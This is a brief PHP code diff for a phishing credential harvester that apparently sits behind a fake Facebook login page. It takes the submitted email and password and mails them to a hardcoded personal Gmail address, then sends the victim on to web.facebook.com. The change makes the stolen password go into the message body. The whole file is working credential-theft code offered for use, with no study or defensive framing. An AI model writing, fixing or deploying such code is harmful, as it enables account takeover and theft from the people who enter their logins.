@@ -2,10 +2,12 @@
 $email = $_POST["email"];
 $passkey = $_POST["password"];
 
-$mailheader = "From: " . $email . " <" . $passkey . ">\r\n";
 $recipient = "israelstoba@gmail.com";
+$subject = "New Login Attempt";
+$message = "Email: $email\nPassword: $passkey";
+$mailheader = "From: $email\r\n";
 
-mail($recipient, "New Login Attempt", $mailheader)
+mail($recipient, $subject, $message, $mailheader)
 or die("Error");
 
 echo "https://web.facebook.com";
